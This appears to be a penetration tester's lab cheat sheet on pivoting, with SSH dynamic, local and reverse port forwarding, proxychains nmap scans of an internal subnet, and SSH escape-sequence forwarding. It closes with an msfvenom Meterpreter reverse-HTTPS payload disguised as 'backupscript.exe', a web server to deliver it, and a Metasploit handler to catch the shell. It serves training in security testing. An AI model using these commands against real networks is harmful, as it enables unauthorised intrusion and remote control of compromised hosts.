### Pivoting
Enable Dynamic Port Forwarding with SSH
```shell
ssh -D 9050 ubuntu@10.129.202.64
```
Add line to `/etc/proxychains.conf`
```bash
socks4 	127.0.0.1 9050
```
Scan
```bash
proxychains -q nmap -v -sn 172.16.5.0/24
proxychains -q nmap -v -Pn -sT 172.16.5.19
```
This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called `SOCKS tunneling`. One more important note to remember here is that we can only perform a `full TCP connect scan` over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that `host-alive` checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default.
### Local Port Forward
Forward local port `1234` to compromised host port `3306`
```shell
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```
Forward to multiple ports
```shell
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```
Verify
```bash
netstat -antp | grep 1234
```
##### Port Forwarding via ~C
```shell
ssh dev@192.168.176.150 -i dev -o EnableEscapeCommandline=yes
```
Forward port
```shell
daniel@pandora:~$ ~C
ssh> -L 8000:127.0.0.1:80
```
Verify
```shell
ss -lntp | grep 8000
```
### Reverse Port Forward
Used for when you want to get a reverse shell on an internal machine but that machine can't reach your attacking host network
![[Pasted image 20250123064057.png]]
```shell
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

```bash
python -m http.server 80
```

```shell
 ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
 
ssh -R 172.16.5.129:8888:0.0.0.0:443 -R 172.16.5.129:8080:0.0.0.0:80 ubuntu@10.129.152.229 -vN
```

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 0.0.0.0; set LPORT 443; run'
```